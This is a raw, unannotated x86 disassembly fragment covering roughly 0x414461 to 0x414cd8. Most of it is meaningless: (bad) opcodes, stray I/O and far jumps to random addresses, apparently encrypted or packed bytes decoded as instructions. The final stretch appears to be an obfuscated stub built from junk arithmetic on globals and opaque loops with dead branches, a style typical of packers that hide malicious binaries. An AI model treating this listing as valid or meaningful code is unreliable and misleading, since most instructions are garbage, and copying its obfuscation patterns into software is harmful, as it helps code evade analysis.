  414461:	mov    al,ds:0xddb0c140
  414466:	sbb    DWORD PTR ds:0x4057eb22,esi
  41446c:	das    
  41446d:	xchg   edx,eax
  41446e:	or     al,0x7
  414470:	push   cs
  414471:	leave  
  414472:	in     al,0x8e
  414474:	pop    ds
  414475:	stos   DWORD PTR es:[edi],eax
  414476:	ins    BYTE PTR es:[edi],dx
  414477:	push   esp
  414478:	pusha  
  414479:	dec    edi
  41447a:	bound  eax,QWORD PTR [eax+edx*2]
  41447d:	add    eax,0x94b11aa7
  414482:	xlat   BYTE PTR ds:[ebx]
  414483:	mov    al,0x1e
  414485:	clc    
  414486:	scas   eax,DWORD PTR es:[edi]
  414487:	daa    
  414488:	jb     0x41448f
  41448a:	retf   
  41448b:	lods   al,BYTE PTR ds:[esi]
  41448c:	and    al,0xa2
  41448e:	mov    al,ds:0x852df983
  414493:	call   0x1045:0x25048063
  41449a:	lock jmp 0x9f1640fe
  4144a0:	rcr    ecx,1
  4144a2:	sub    dh,BYTE PTR [ecx+0x7a]
  4144a5:	inc    esp
  4144a6:	xchg   edi,eax
  4144a7:	mov    ecx,0xf1211abd
  4144ac:	and    DWORD PTR [ecx+0x6d],0xffffffb9
  4144b0:	jl     0x414483
  4144b2:	and    al,0x6a
  4144b4:	shl    edi,cl
  4144b6:	or     al,0x6
  4144b8:	and    eax,0x2fb174f9
  4144bd:	jb     0x4144b3
  4144bf:	push   es
  4144c0:	dec    DWORD PTR [ebx]
  4144c2:	jp     0x41452a
  4144c4:	inc    eax
  4144c5:	inc    esi
  4144c6:	cmp    al,0xb9
  4144c8:	sbb    edi,0xa5327825
  4144ce:	mov    ds:0x5649b807,eax
  4144d3:	mov    BYTE PTR [ebx],bl
  4144d5:	stos   BYTE PTR es:[edi],al
  4144d6:	pushf  
  4144d7:	std    
  4144d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144d9:	and    eax,0xece64b5a
  4144de:	jecxz  0x4144e5
  4144e0:	test   eax,0xd6d7e76a
  4144e5:	loopne 0x4144bd
  4144e7:	xchg   ebp,eax
  4144e8:	cld    
  4144e9:	cmp    eax,DWORD PTR [ebx+0x6994130]
  4144ef:	and    eax,0xae41062e
  4144f4:	je     0x4144fd
  4144f6:	jmp    0x196c:0x9b65496
  4144fd:	dec    edx
  4144fe:	hlt    
  4144ff:	mov    ch,0xe8
  414501:	cmp    eax,0x7b5151ef
  414506:	sub    ah,BYTE PTR [ebp+esi*1-0xe]
  41450a:	arpl   WORD PTR [esi],dx
  41450c:	icebp  
  41450d:	add    DWORD PTR [esp-0xe],ebp
  414511:	mov    edx,0xaa1145a7
  414516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414517:	mov    eax,ds:0xc8a1d1d5
  41451c:	fidiv  WORD PTR [edi-0x79]
  41451f:	sub    eax,0xc4da7fb7
  414524:	mul    cl
  414526:	dec    edi
  414527:	and    al,BYTE PTR [ebx+edi*2]
  41452a:	adc    eax,0x75f1ff74
  41452f:	add    eax,DWORD PTR [ecx+0x6d]
  414532:	jb     0x41455a
  414534:	imul   esp,DWORD PTR [ecx-0x46],0xffffff89
  414538:	scas   eax,DWORD PTR es:[edi]
  414539:	jmp    0xc600:0xb5ffe883
  414540:	inc    eax
  414541:	sub    al,0x4b
  414543:	mov    edi,0xfad51fd8
  414548:	(bad)  
  41454a:	mov    eax,ds:0xf21a7f89
  41454f:	and    ebx,DWORD PTR [ebx-0x20823a0c]
  414555:	mov    bl,0xff
  414557:	jb     0x4145d7
  414559:	loopne 0x4144f5
  41455b:	leave  
  41455c:	and    eax,0xdfc3ca3b
  414561:	mov    ah,BYTE PTR [esp+ecx*2-0x29]
  414565:	jmp    0x1eab58d7
  41456a:	dec    esp
  41456b:	adc    al,0x1a
  41456d:	lahf   
  41456e:	leave  
  41456f:	test   eax,0x8a421c20
  414574:	clc    
  414575:	sbb    eax,0xb5bdfabf
  41457a:	xchg   edx,eax
  41457b:	ret    0xd642
  41457e:	call   0xcf67aef8
  414583:	mov    edx,0x8463568f
  414588:	jb     0x4145f6
  41458a:	lock fsubr st(0),st
  41458d:	loopne 0x414601
  41458f:	push   esi
  414590:	aad    0x4
  414592:	mov    cl,0xb9
  414594:	dec    edi
  414595:	mov    edi,?
  414597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414598:	repz push 0x6b
  41459b:	imul   ecx,DWORD PTR [esi-0x3f],0x7aeaf0f1
  4145a2:	fldcw  WORD PTR [edx+0x42]
  4145a5:	in     eax,dx
  4145a6:	aaa    
  4145a7:	div    BYTE PTR [edx]
  4145a9:	stos   BYTE PTR es:[edi],al
  4145aa:	xor    eax,0xd28eb150
  4145af:	(bad)  
  4145b0:	mov    ch,0x25
  4145b2:	pop    ebx
  4145b3:	mov    dl,0x33
  4145b5:	hlt    
  4145b6:	pop    edi
  4145b7:	push   ebp
  4145b8:	pop    ss
  4145b9:	adc    al,0x68
  4145bb:	out    0x51,eax
  4145bd:	inc    ebx
  4145be:	dec    edx
  4145bf:	pop    ebp
  4145c0:	clc    
  4145c1:	adc    edx,DWORD PTR [ecx+0xb]
  4145c4:	popf   
  4145c5:	adc    edi,esp
  4145c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145c8:	pop    ds
  4145c9:	je     0x4145e7
  4145cb:	mov    ds:0xbca51864,al
  4145d0:	iretw  
  4145d2:	add    eax,DWORD PTR [edx-0x5619b57c]
  4145d8:	gs xchg esi,eax
  4145da:	(bad)  
  4145db:	push   esp
  4145dc:	mov    eax,DWORD PTR [ebx-0x22c895c7]
  4145e2:	clc    
  4145e3:	in     al,dx
  4145e4:	add    BYTE PTR [ebp+0x2a],bl
  4145e7:	int3   
  4145e8:	mov    esi,0xaf64b994
  4145ed:	mov    esp,0xe4c2df7a
  4145f2:	mov    BYTE PTR [edi],0xcc
  4145f5:	pusha  
  4145f6:	mov    dl,0x8c
  4145f8:	arpl   WORD PTR ds:0x17f8d033,ax
  4145fe:	jnp    0x414631
  414600:	clc    
  414601:	lods   al,BYTE PTR ds:[esi]
  414602:	pop    ebp
  414603:	cmc    
  414604:	iret   
  414605:	jmp    0x66d4:0x4a6d0fb7
  41460c:	mov    ebx,0xf8f85593
  414611:	mov    al,ds:0xee8c54f4
  414616:	popf   
  414617:	cwde   
  414618:	push   eax
  414619:	sub    eax,edi
  41461b:	mov    cl,ch
  41461d:	mov    ecx,0xcd46dcf6
  414622:	arpl   WORD PTR [esp+eiz*4+0x8],di
  414626:	cli    
  414627:	lods   al,BYTE PTR ds:[esi]
  414628:	pop    edx
  414629:	sbb    bl,ah
  41462b:	ins    BYTE PTR es:[edi],dx
  41462c:	push   ecx
  41462d:	retf   0xa08b
  414630:	cmp    al,0x43
  414632:	popa   
  414633:	leave  
  414634:	mov    gs,WORD PTR [ebp-0x7e994d84]
  41463a:	stos   DWORD PTR es:[edi],eax
  41463b:	cmp    bh,BYTE PTR [ecx-0x9]
  41463e:	(bad)  
  41463f:	fisttp QWORD PTR [ecx+0x63]
  414642:	mov    es,esp
  414644:	and    eax,0x2db7d6d0
  414649:	sbb    BYTE PTR [edi-0x16f61a84],ch
  41464f:	repnz fistp DWORD PTR [esi]
  414652:	pop    esi
  414653:	dec    eax
  414654:	daa    
  414655:	mov    cl,0x14
  414657:	inc    ebx
  414658:	and    BYTE PTR [edi],ch
  41465a:	aam    0x9f
  41465c:	or     BYTE PTR [eax],dh
  41465e:	jnp    0x4146d4
  414660:	(bad)  
  414661:	out    0x3c,al
  414663:	out    0xec,eax
  414665:	rcr    BYTE PTR [esi+0x1c],cl
  414668:	xchg   ecx,eax
  414669:	idiv   DWORD PTR ds:0x45527244
  41466f:	fs (bad) 
  414671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414672:	aaa    
  414673:	mov    al,0x97
  414675:	(bad)  
  414676:	xor    DWORD PTR cs:[ebp-0x74ed2d58],ecx
  41467d:	adc    eax,0x9bf7dba3
  414682:	scas   eax,DWORD PTR es:[edi]
  414683:	inc    edi
  414684:	pop    eax
  414685:	in     eax,dx
  414686:	repnz add eax,0x516307f
  41468c:	outs   dx,BYTE PTR ds:[esi]
  41468d:	push   edx
  41468e:	push   ebp
  41468f:	mov    DWORD PTR [esi-0x21],ecx
  414692:	mov    WORD PTR ds:0x3c36701a,?
  414698:	mov    ebx,0xbc8202b
  41469d:	mov    BYTE PTR [edi],ch
  41469f:	fst    DWORD PTR [ebx-0x6374a30a]
  4146a5:	xchg   ecx,eax
  4146a6:	inc    edx
  4146a7:	imul   ecx,esp,0xffffffa7
  4146aa:	lods   al,BYTE PTR ds:[esi]
  4146ab:	lods   al,BYTE PTR ds:[esi]
  4146ac:	push   ecx
  4146ad:	popa   
  4146ae:	les    esi,FWORD PTR [ecx+0x70]
  4146b1:	dec    ebx
  4146b2:	pop    esi
  4146b3:	lds    ebx,FWORD PTR [ecx-0x55]
  4146b6:	(bad)  
  4146b7:	mov    al,ds:0x3d319c37
  4146bc:	aas    
  4146bd:	dec    ebx
  4146be:	test   al,0x67
  4146c0:	mov    bh,0x86
  4146c2:	jge    0x41467b
  4146c4:	aam    0x1
  4146c6:	xchg   edx,eax
  4146c7:	push   eax
  4146c8:	ja     0x414680
  4146ca:	adc    eax,DWORD PTR [eax+0x15]
  4146cd:	push   ss
  4146ce:	dec    ecx
  4146cf:	rol    DWORD PTR [ebx-0x6534e5ae],cl
  4146d5:	mov    ebp,DWORD PTR [eax]
  4146d7:	dec    ecx
  4146d8:	das    
  4146d9:	gs ins BYTE PTR es:[edi],dx
  4146db:	sub    eax,DWORD PTR [eax]
  4146dd:	push   0x4bec47f7
  4146e2:	repnz pop esp
  4146e4:	fwait
  4146e5:	in     eax,dx
  4146e6:	or     ecx,DWORD PTR [ebx-0x1d]
  4146e9:	push   ebp
  4146ea:	scas   al,BYTE PTR es:[edi]
  4146eb:	add    eax,0x29e4a7fd
  4146f0:	pop    edi
  4146f1:	inc    esp
  4146f2:	sub    esp,DWORD PTR [bx]
  4146f5:	inc    ebp
  4146f6:	or     BYTE PTR [edx+ebx*8],bl
  4146f9:	add    DWORD PTR [eax-0x64e92557],ebp
  4146ff:	stos   DWORD PTR es:[edi],eax
  414700:	jp     0x414771
  414702:	int    0x66
  414704:	or     al,0x3
  414706:	lahf   
  414707:	lods   eax,DWORD PTR ds:[esi]
  414708:	fs mov esi,esi
  41470b:	add    edi,DWORD PTR [ecx-0x63]
  41470e:	dec    ebp
  41470f:	shl    BYTE PTR [esi-0x68],cl
  414712:	push   0x9860600
  414717:	test   DWORD PTR [ecx-0x8882420],0xbcd82d55
  414721:	aam    0xff
  414723:	iret   
  414724:	push   ecx
  414725:	sar    ebp,1
  414727:	adc    cl,al
  414729:	jge    0x414719
  41472b:	inc    edx
  41472c:	mov    ah,0x5a
  41472e:	push   esp
  41472f:	call   0xe73abaf8
  414734:	jo     0x4146df
  414736:	popw   es
  414738:	lea    esp,[edx+eiz*2-0x13]
  41473c:	mov    gs,WORD PTR [esi+0x58]
  41473f:	xor    ah,al
  414741:	mov    esp,0x83554855
  414746:	fidiv  WORD PTR [ebx+eiz*2-0x51310126]
  41474d:	push   edx
  41474e:	sub    eax,edi
  414750:	mov    dh,0xda
  414752:	mov    cl,0xb7
  414754:	mov    cl,0x88
  414756:	push   eax
  414757:	mov    bh,0xa4
  414759:	mov    ds:0x6ed286a7,al
  41475e:	mov    ch,0x1d
  414760:	(bad)  
  414761:	loopne 0x4147ca
  414763:	ds dec edi
  414765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414766:	in     al,dx
  414767:	fcmovb st,st(6)
  414769:	(bad)  
  41476a:	dec    esp
  41476b:	pop    esi
  41476c:	or     DWORD PTR [esi-0x7f],esi
  41476f:	cmc    
  414770:	inc    ebp
  414771:	push   0x73
  414773:	xchg   BYTE PTR [esi-0x5d],dl
  414776:	pop    ebx
  414777:	jnp    0x414785
  414779:	or     ebx,0x61
  41477c:	(bad)  
  41477e:	pop    ebp
  414780:	xor    ecx,DWORD PTR [esi+0x33]
  414783:	stos   BYTE PTR es:[edi],al
  414784:	jmp    0x857fde02
  414789:	or     eax,DWORD PTR [ebx-0x6a866149]
  41478f:	out    0x4e,eax
  414791:	push   cs
  414792:	or     al,cl
  414794:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414795:	aas    
  414796:	shl    DWORD PTR [edi-0x3f],0x67
  41479a:	std    
  41479b:	adc    eax,0xe0c5a3bf
  4147a0:	inc    eax
  4147a1:	xchg   ebx,eax
  4147a2:	dec    esp
  4147a3:	or     BYTE PTR [edi-0x3d],cl
  4147a6:	mov    BYTE PTR [edi-0x41f7ec2f],cl
  4147ac:	aaa    
  4147ad:	push   ebp
  4147ae:	pop    ecx
  4147af:	xchg   edi,eax
  4147b0:	out    0x3e,eax
  4147b2:	outs   dx,BYTE PTR ds:[esi]
  4147b3:	test   ecx,0x44430252
  4147b9:	int3   
  4147ba:	jecxz  0x414746
  4147bc:	retf   0xb1cb
  4147bf:	(bad)  
  4147c0:	rol    DWORD PTR [ecx+eiz*2+0x3f],1
  4147c4:	pop    ebp
  4147c5:	lock dec edx
  4147c7:	inc    edx
  4147c8:	cmp    al,BYTE PTR [ebx]
  4147ca:	mov    eax,DWORD PTR [edx]
  4147cc:	jbe    0x4147c1
  4147ce:	clc    
  4147cf:	mov    WORD PTR [ebp+edx*8+0x1e1febe2],?
  4147d6:	push   ebx
  4147d7:	add    DWORD PTR [edi],edx
  4147d9:	or     bh,BYTE PTR [ecx-0x70]
  4147dc:	iret   
  4147dd:	sar    DWORD PTR [edi+edi*1],0x5
  4147e1:	pusha  
  4147e2:	cwde   
  4147e3:	mov    ch,0xaf
  4147e5:	sub    eax,0x68225414
  4147ea:	pop    esp
  4147eb:	test   BYTE PTR [edi+0x29],ah
  4147ee:	adc    eax,DWORD PTR [eax-0x20dd5ef6]
  4147f4:	mov    ebp,0x43b0a1cc
  4147f9:	sbb    ebx,DWORD PTR [edx]
  4147fb:	or     eax,0x8c9c44ab
  414800:	push   ebx
  414801:	pop    esi
  414802:	ss loope 0x414858
  414805:	mov    bl,0x53
  414807:	add    dl,ch
  414809:	push   0x72
  41480b:	sti    
  41480c:	push   ebx
  41480d:	fs repnz adc eax,0x91b65974
  414814:	jmp    0x845d:0x3c7c99da
  41481b:	xor    DWORD PTR [edx+eax*4+0x3],ebp
  41481f:	jnp    0x4147ec
  414821:	hlt    
  414822:	xchg   esp,eax
  414823:	leave  
  414824:	adc    al,0x36
  414826:	shr    esp,cl
  414828:	daa    
  414829:	dec    esi
  41482a:	push   edi
  41482b:	cmc    
  41482c:	mov    esi,0x66d78d3f
  414831:	mov    ebp,0x1cfd5366
  414836:	push   cs
  414837:	call   0x7669:0x83d23192
  41483e:	mov    ds:0x413557e4,eax
  414843:	xchg   DWORD PTR [edx],ebx
  414845:	or     al,0x1e
  414847:	pop    ss
  414848:	or     cl,BYTE PTR [eax+0x3d]
  41484b:	int    0xc0
  41484d:	jno    0x414892
  41484f:	enter  0xeacb,0xf
  414853:	or     edx,DWORD PTR [edx-0x28fa5943]
  414859:	lods   eax,DWORD PTR ds:[esi]
  41485a:	ins    BYTE PTR es:[edi],dx
  41485b:	scas   eax,DWORD PTR es:[edi]
  41485c:	popf   
  41485d:	mov    ds:0xb2248ee4,al
  414862:	and    cl,dl
  414864:	icebp  
  414865:	int3   
  414866:	mov    ds:0x16a94416,eax
  41486b:	(bad)  
  41486d:	loopne 0x4148ae
  41486f:	lahf   
  414870:	dec    edi
  414871:	cmp    ebp,DWORD PTR [esi]
  414873:	test   DWORD PTR [ebx+0x647d5304],esi
  414879:	(bad)  
  41487a:	cdq    
  41487b:	cmp    DWORD PTR [edx],0xbb3ae43a
  414881:	mov    eax,cs
  414883:	cmp    edi,edi
  414885:	stc    
  414886:	ror    BYTE PTR [esi],1
  414888:	mov    ebx,0x97f7415b
  41488d:	xlat   BYTE PTR ds:[ebx]
  41488e:	mov    edi,0x47cc648a
  414893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414894:	inc    ebp
  414895:	sar    DWORD PTR [ebx],1
  414897:	sub    ebx,eax
  414899:	stos   DWORD PTR es:[edi],eax
  41489a:	fld1   
  41489c:	cli    
  41489d:	dec    edx
  41489e:	mov    ah,0xe6
  4148a0:	jne    0x414839
  4148a2:	in     eax,dx
  4148a3:	jmp    0x264dd82d
  4148a8:	test   BYTE PTR [ecx],dl
  4148aa:	lahf   
  4148ab:	fs inc esi
  4148ad:	fwait
  4148ae:	xor    eax,0xbddd79e4
  4148b3:	xor    DWORD PTR [eax-0x7c],eax
  4148b6:	sar    BYTE PTR [esi+0x9],cl
  4148b9:	mov    edi,0x878652f7
  4148be:	imul   esp,DWORD PTR [ebx-0x6c707406],0x6de189ed
  4148c8:	mov    cl,0x3c
  4148ca:	popa   
  4148cb:	add    eax,0x24626392
  4148d0:	pop    esp
  4148d1:	loope  0x414907
  4148d3:	test   BYTE PTR [ebp+eax*1+0x1d62be1],bl
  4148da:	sub    BYTE PTR [eax-0x1],bh
  4148dd:	call   0x7d49:0x68ae621b
  4148e4:	mov    ch,0xa4
  4148e6:	jmp    0x414877
  4148e8:	dec    esp
  4148e9:	dec    esp
  4148ea:	icebp  
  4148eb:	sub    dl,0x6b
  4148ee:	ss sub al,0xcc
  4148f1:	sti    
  4148f2:	jno    0x4148ff
  4148f4:	pushf  
  4148f5:	jle    0x4148f5
  4148f7:	sub    ah,al
  4148f9:	repnz retf 
  4148fb:	aaa    
  4148fc:	jge    0x414894
  4148fe:	push   ss
  4148ff:	xchg   ebx,eax
  414900:	mov    cs,WORD PTR [edi-0x4]
  414903:	inc    ecx
  414904:	mov    esp,0xeb4fdcab
  414909:	jno    0x4148ac
  41490b:	adc    BYTE PTR [ebp-0x7c4bf123],dh
  414911:	(bad)  
  414912:	clc    
  414913:	xchg   edx,eax
  414914:	mov    ebx,0xffdf43a3
  414919:	add    eax,0x5b19a74e
  41491f:	cmp    esp,ecx
  414921:	and    ah,BYTE PTR [eax]
  414923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414924:	cdq    
  414925:	pop    ebx
  414926:	and    al,0xba
  414928:	jne    0x414990
  41492a:	call   0x5249:0xa5f36e33
  414931:	jle    0x414990
  414933:	cmp    esi,esp
  414935:	adc    al,0x4d
  414937:	iret   
  414938:	push   ss
  414939:	inc    ebx
  41493a:	cdq    
  41493b:	xchg   ecx,eax
  41493c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41493d:	inc    ebx
  41493e:	pusha  
  41493f:	scas   al,BYTE PTR es:[edi]
  414940:	pushf  
  414941:	adc    ebx,DWORD PTR [ebp+esi*1-0x646abdd8]
  414948:	and    BYTE PTR [ebp-0x34943e23],0x3b
  41494f:	sbb    eax,0x2af2f943
  414954:	popa   
  414955:	test   BYTE PTR gs:[edx],bl
  414958:	mov    edx,0xa4ad3190
  41495d:	mov    cl,0x37
  41495f:	mov    ds:0xc1d97ed7,eax
  414964:	psrad  mm1,QWORD PTR [esi+0x20]
  414968:	scas   al,BYTE PTR es:[edi]
  414969:	dec    ecx
  41496a:	rol    BYTE PTR [ebx-0x31],cl
  41496d:	mov    DWORD PTR [esi+0x6a],esi
  414970:	cmp    esp,DWORD PTR [edi+0x59f206ba]
  414976:	(bad)  
  414977:	cmp    eax,0xf47eb4c2
  41497c:	add    al,0xe3
  41497e:	jbe    0x414982
  414980:	mov    ecx,0xc8d7c83c
  414985:	mov    ch,0x71
  414987:	and    eax,0x9eaf331f
  41498c:	ja     0x41497d
  41498e:	inc    esp
  41498f:	xchg   ebp,eax
  414990:	fisub  WORD PTR [ebx+0x3a828617]
  414996:	(bad)  
  414997:	fnstcw WORD PTR [edx-0x2af9af34]
  41499d:	mov    BYTE PTR [edx],bl
  41499f:	mov    DWORD PTR ds:0x6f75160c,esi
  4149a5:	jl     0x414960
  4149a7:	and    BYTE PTR [esi],al
  4149a9:	adc    DWORD PTR [edi-0x68],0xdafc604b
  4149b0:	cli    
  4149b1:	daa    
  4149b2:	push   cs
  4149b3:	scas   eax,DWORD PTR es:[edi]
  4149b4:	out    dx,al
  4149b5:	addr16 (bad) 
  4149b7:	(bad)  
  4149b8:	cmp    esp,DWORD PTR [edi-0x5e]
  4149bb:	mov    al,ds:0x63cb00f9
  4149c0:	or     al,0x74
  4149c2:	xor    eax,0xefbed56d
  4149c7:	aas    
  4149c8:	daa    
  4149c9:	(bad)  
  4149cb:	fmul   DWORD PTR [edi]
  4149cd:	adc    ah,BYTE PTR [eax-0xe606ce4]
  4149d3:	xor    BYTE PTR [si],0x5f
  4149d7:	std    
  4149d8:	push   es
  4149d9:	fsubrp st(5),st
  4149db:	aam    0x7d
  4149dd:	loop   0x4149c2
  4149df:	loopne 0x414a0b
  4149e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149e2:	loop   0x4149e9
  4149e4:	loopne 0x4149fd
  4149e6:	mov    edi,0xa751f033
  4149eb:	gs mov esi,0xbe518756
  4149f1:	imul   al
  4149f3:	adc    eax,0xab87c766
  4149f8:	das    
  4149f9:	pop    ds
  4149fa:	sbb    dh,bl
  4149fc:	fnstsw WORD PTR [ecx+0x4f]
  4149ff:	mov    ch,0x6f
  414a01:	mov    eax,0xe412de3f
  414a06:	cdq    
  414a07:	push   ebx
  414a08:	dec    edi
  414a09:	test   esi,ecx
  414a0b:	or     esi,DWORD PTR [esi+0x71121e6a]
  414a11:	xchg   esi,eax
  414a12:	scas   al,BYTE PTR es:[edi]
  414a13:	and    DWORD PTR [esi+0x1c9bc045],ecx
  414a19:	les    edi,FWORD PTR [ebx+0x47]
  414a1c:	shl    BYTE PTR [ebp+0x155e725c],1
  414a22:	sub    DWORD PTR [eax],ebp
  414a24:	cwde   
  414a25:	sbb    BYTE PTR [edi+0x54686711],cl
  414a2b:	mov    esi,0xbe5df02
  414a30:	sub    ebx,esp
  414a32:	pop    ds
  414a33:	jl     0x414aab
  414a35:	dec    ecx
  414a36:	cmp    ah,BYTE PTR [ecx]
  414a38:	jp     0x4149f7
  414a3a:	fiadd  DWORD PTR [esi+0x3]
  414a3d:	sub    eax,0xcc26dc40
  414a42:	dec    edx
  414a43:	lock js 0x414a76
  414a46:	les    ecx,FWORD PTR [ecx]
  414a48:	cdq    
  414a49:	repz es pop esi
  414a4c:	cmp    ebx,DWORD PTR [esi+0x4e]
  414a4f:	stos   BYTE PTR es:[edi],al
  414a50:	jo     0x414ad1
  414a52:	mov    ebp,0xd7487030
  414a57:	sub    DWORD PTR [edi-0x43],esi
  414a5a:	test   bh,0x3c
  414a5d:	int    0x32
  414a5f:	es jo  0x4149e9
  414a62:	js     0x414adf
  414a64:	mov    dl,0xe3
  414a66:	aas    
  414a67:	push   0x35
  414a69:	mov    ch,0xc3
  414a6b:	add    al,0x1
  414a6d:	popa   
  414a6e:	test   BYTE PTR [ecx],ah
  414a70:	aad    0x39
  414a72:	xchg   ebp,eax
  414a73:	jle    0x414aea
  414a75:	push   edi
  414a76:	and    ah,BYTE PTR [ecx+0x68753982]
  414a7c:	xchg   ebx,eax
  414a7d:	push   0x5d974e8e
  414a82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a83:	adc    DWORD PTR [esp+ecx*4],0x8bb44d89
  414a8a:	dec    ebp
  414a8b:	or     BYTE PTR [edx-0x241fcdf],bh
  414a91:	sub    edx,ecx
  414a93:	add    edx,DWORD PTR [ebp-0x48]
  414a96:	mov    DWORD PTR [ebp-0x48],edx
  414a99:	mov    ecx,DWORD PTR [ebp+0x8]
  414a9c:	mov    edx,DWORD PTR [ebp-0x44]
  414a9f:	add    ecx,edi
  414aa1:	xor    ecx,edx
  414aa3:	mov    DWORD PTR [ebp-0x44],ecx
  414aa6:	mov    ecx,DWORD PTR [ebp+0x8]
  414aa9:	xor    ecx,eax
  414aab:	add    ecx,esi
  414aad:	jne    0x4126b9
  414ab3:	mov    ecx,DWORD PTR [ebp-0x8]
  414ab6:	xor    ecx,eax
  414ab8:	mov    eax,DWORD PTR [ebp+0x10]
  414abb:	add    ecx,esi
  414abd:	mov    DWORD PTR [eax],ecx
  414abf:	pop    edi
  414ac0:	pop    esi
  414ac1:	pop    ebx
  414ac2:	leave  
  414ac3:	ret    0xc
  414ac6:	push   ebp
  414ac7:	mov    ebp,esp
  414ac9:	sub    esp,0x78
  414acc:	mov    eax,ds:0x42a079
  414ad1:	xor    ecx,ecx
  414ad3:	xor    ecx,DWORD PTR ds:0x42a07d
  414ad9:	sub    eax,ecx
  414adb:	add    eax,DWORD PTR [eax+ecx*1]
  414ade:	push   esi
  414adf:	adc    DWORD PTR ds:0x428e29,ecx
  414ae5:	push   edi
  414ae6:	and    edi,0x4523
  414aec:	mov    eax,ds:0x428365
  414af1:	mov    DWORD PTR [ebp-0x24],eax
  414af4:	add    esi,DWORD PTR ds:0x428ed1
  414afa:	mov    eax,ds:0x428485
  414aff:	add    DWORD PTR ds:0x428e45,0x631e
  414b09:	mov    DWORD PTR [ebp-0x30],eax
  414b0c:	sub    esi,esi
  414b0e:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  414b15:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  414b1c:	xor    eax,ecx
  414b1e:	mov    eax,DWORD PTR [ebp-0x10]
  414b21:	or     DWORD PTR ds:0x428e35,0x297e
  414b2b:	mov    ecx,DWORD PTR [ebp-0x10]
  414b2e:	sub    eax,ecx
  414b30:	mov    DWORD PTR ds:0x428ea1,0x15
  414b3a:	cmp    DWORD PTR ds:0x428ea1,0x0
  414b41:	je     0x414b99
  414b47:	cmp    DWORD PTR ds:0x428ea1,0x5
  414b4e:	jb     0x414b99
  414b54:	jmp    0x414b6b
  414b59:	push   0x4280ea
  414b5e:	push   0x1
  414b60:	push   0x6e8b
  414b65:	call   DWORD PTR ds:0x42ca60
  414b6b:	cmp    DWORD PTR ds:0x428ea1,0x6
  414b72:	jne    0x414b87
  414b78:	xor    edi,edi
  414b7a:	or     edi,DWORD PTR ds:0x428ea1
  414b80:	dec    edi
  414b81:	mov    DWORD PTR ds:0x428ea1,edi
  414b87:	mov    edi,DWORD PTR ds:0x428ea1
  414b8d:	dec    edi
  414b8e:	mov    DWORD PTR ds:0x428ea1,edi
  414b94:	jmp    0x414b3a
  414b99:	mov    DWORD PTR [ebp-0x10],eax
  414b9c:	sub    DWORD PTR ds:0x428e75,0x4181
  414ba6:	xor    DWORD PTR [ebp-0x10],0xf89cb5b9
  414bad:	mov    eax,DWORD PTR [ebp-0x18]
  414bb0:	neg    edi
  414bb2:	mov    ecx,DWORD PTR [ebp-0x18]
  414bb5:	sub    eax,ecx
  414bb7:	mov    DWORD PTR [ebp-0x18],eax
  414bba:	or     DWORD PTR [ebp-0x18],0xf89f05b9
  414bc1:	add    DWORD PTR ds:0x428e31,0x596
  414bcb:	mov    eax,DWORD PTR [ebp-0xc]
  414bce:	adc    DWORD PTR ds:0x428e25,ebx
  414bd4:	mov    ecx,DWORD PTR [ebp-0xc]
  414bd7:	add    DWORD PTR ds:0x428e69,ecx
  414bdd:	sub    eax,ecx
  414bdf:	add    edi,0x58c9
  414be5:	mov    DWORD PTR [ebp-0xc],eax
  414be8:	or     DWORD PTR [ebp-0xc],0xf89c85f9
  414bef:	adc    ecx,0x6a40
  414bf5:	mov    eax,DWORD PTR [ebp-0x1c]
  414bf8:	mov    ecx,DWORD PTR [ebp-0x1c]
  414bfb:	adc    DWORD PTR ds:0x428ea5,ecx
  414c01:	sub    eax,ecx
  414c03:	xor    DWORD PTR ds:0x428e8d,edi
  414c09:	mov    DWORD PTR [ebp-0x1c],eax
  414c0c:	or     DWORD PTR [ebp-0x1c],0xf89c8599
  414c13:	mov    eax,DWORD PTR [ebp-0x20]
  414c16:	neg    DWORD PTR ds:0x428ea9
  414c1c:	mov    ecx,DWORD PTR [ebp-0x20]
  414c1f:	sub    eax,ecx
  414c21:	xor    esi,esi
  414c23:	xor    esi,DWORD PTR ds:0x4292f5
  414c29:	xor    edi,edi
  414c2b:	xor    edi,DWORD PTR ds:0x429bf5
  414c31:	sub    esi,edi
  414c33:	or     esi,DWORD PTR [esi+edi*1]
  414c36:	mov    DWORD PTR [ebp-0x20],eax
  414c39:	or     eax,edi
  414c3b:	mov    eax,DWORD PTR [ebp-0x2c]
  414c3e:	and    DWORD PTR ds:0x428e25,0x0
  414c48:	jmp    0x414c5a
  414c4d:	mov    esi,DWORD PTR ds:0x428e25
  414c53:	inc    esi
  414c54:	mov    DWORD PTR ds:0x428e25,esi
  414c5a:	cmp    DWORD PTR ds:0x428e25,0x1e
  414c61:	jae    0x414c93
  414c67:	cmp    DWORD PTR ds:0x428e25,0x2c
  414c6e:	jb     0x414c93
  414c74:	jmp    0x414c8e
  414c79:	push   0x42819a
  414c7e:	push   0x0
  414c80:	push   DWORD PTR [ebp-0x14]
  414c83:	push   0x541c
  414c88:	call   DWORD PTR ds:0x42ca64
  414c8e:	jmp    0x414c4d
  414c93:	mov    ecx,DWORD PTR [ebp-0x20]
  414c96:	mov    esi,0x75108b1
  414c9b:	xor    eax,esi
  414c9d:	adc    DWORD PTR ds:0x428ec9,0x2d36
  414ca7:	mov    edi,0x3272f8
  414cac:	and    DWORD PTR ds:0x428e91,0x428e49
  414cb6:	add    eax,edi
  414cb8:	or     eax,ecx
  414cba:	or     DWORD PTR ds:0x428e2d,0x148
  414cc4:	mov    DWORD PTR [ebp-0x20],eax
  414cc7:	mov    DWORD PTR ds:0x428e99,0x13
  414cd1:	cmp    DWORD PTR ds:0x428e99,0x0
  414cd8:	je     0x414d27
